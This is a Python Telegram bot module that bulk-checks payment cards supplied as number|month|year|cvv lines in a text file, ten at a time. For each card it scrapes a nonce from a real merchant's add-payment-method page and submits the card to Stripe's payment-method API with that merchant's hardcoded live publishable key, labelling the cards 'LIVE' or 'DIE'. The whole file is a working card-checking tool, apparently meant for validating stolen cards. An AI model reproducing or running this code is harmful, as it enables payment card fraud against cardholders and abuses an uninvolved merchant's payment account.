import re, os, aiohttp, json, asyncio
from telegram import Update, Document, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes
from config import OWNER_ID

ADMIN_FILE = "admins.json"
checking_users = set()
user_live_results = {}

def get_admins():
    if not os.path.exists(ADMIN_FILE):
        return [OWNER_ID]
    with open(ADMIN_FILE) as f:
        return json.load(f)

def save_admins(admins):
    with open(ADMIN_FILE, "w") as f:
        json.dump(admins, f)

async def txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in get_admins():
        return await update.message.reply_text("⛔ Unauthorized")

    if user_id in checking_users:
        return await update.message.reply_text("⚠️ Already checking...")

    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        return await update.message.reply_text("❌ Reply to a .txt file")

    doc: Document = update.message.reply_to_message.document
    if not doc.file_name.endswith(".txt"):
        return await update.message.reply_text("❌ Not a .txt file")

    checking_users.add(user_id)
    context.user_data['stop'] = True
    user_live_results[user_id] = []

    file = await doc.get_file()
    path = f"cc_{user_id}.txt"
    await file.download_to_drive(path)
    with open(path) as f:
        ccs = [line.strip() for line in f if "|" in line]

    if not ccs:
        checking_users.discard(user_id)
        return await update.message.reply_text("❌ File empty")

    status_msg = await update.message.reply_text("📂 Checking file...")
    approved = 0
    declined = 0
    total = len(ccs)

    async def update_status():
        kb = [[
            InlineKeyboardButton(f"✅ {approved}", callback_data="noop"),
            InlineKeyboardButton(f"❌ {declined}", callback_data="noop"),
            InlineKeyboardButton(f"📦 {total}", callback_data="noop")
        ]]
        try:
            await status_msg.edit_reply_markup(reply_markup=InlineKeyboardMarkup(kb))
        except:
            pass

    semaphore = asyncio.Semaphore(10)

    async def check_and_count(cc):
        nonlocal approved, declined
        async with semaphore:
            result = await check_card(cc)
            if result.startswith("✅"):
                approved += 1
                user_live_results[user_id].append(result)
            elif result.startswith("❌"):
                declined += 1
            await update_status()

    tasks = [check_and_count(cc) for cc in ccs]
    await asyncio.gather(*tasks)

    checking_users.discard(user_id)
    await update.message.reply_text("✅ File check done.")

    if user_live_results[user_id]:
        dump = "\n".join(user_live_results[user_id])
        await update.message.reply_text(f"<b>LIVE:</b>\n{dump}", parse_mode="HTML")
    user_live_results.pop(user_id, None)

async def check_card(cc: str) -> str:
    DOMAIN = "https://infiniteautowerks.com"
    PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
    try:
        number, month, year, cvv = cc.strip().split("|")
        year = year if len(year) == 4 else "20" + year
        async with aiohttp.ClientSession() as s:
            for _ in range(3):
                try:
                    r1 = await s.get(f"{DOMAIN}/my-account/add-payment-method/")
                    t1 = await r1.text()
                    nonce = t1.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
                    if nonce:
                        break
                except:
                    continue
            else:
                return f"⚠️ Nonce fail: {cc}"

            data = {
                "type": "card", "card[number]": number, "card[exp_month]": month, "card[exp_year]": year,
                "card[cvc]": cvv, "billing_details[address][postal_code]": "99501", "billing_details[address][country]": "US",
                "key": PK, "_stripe_version": "2024-06-20"
            }
            headers = {"content-type": "application/x-www-form-urlencoded"}
            r2 = await s.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers)
            t2 = await r2.text()
            if '"succeeded"' in t2:
                return f"✅ LIVE: {cc}"
            elif "card_declined" in t2:
                return f"❌ DIE: {cc}"
            else:
                return f"⚠️ Unknown: {cc}"
    except Exception as e:
        return f"⚠️ Error: {cc}"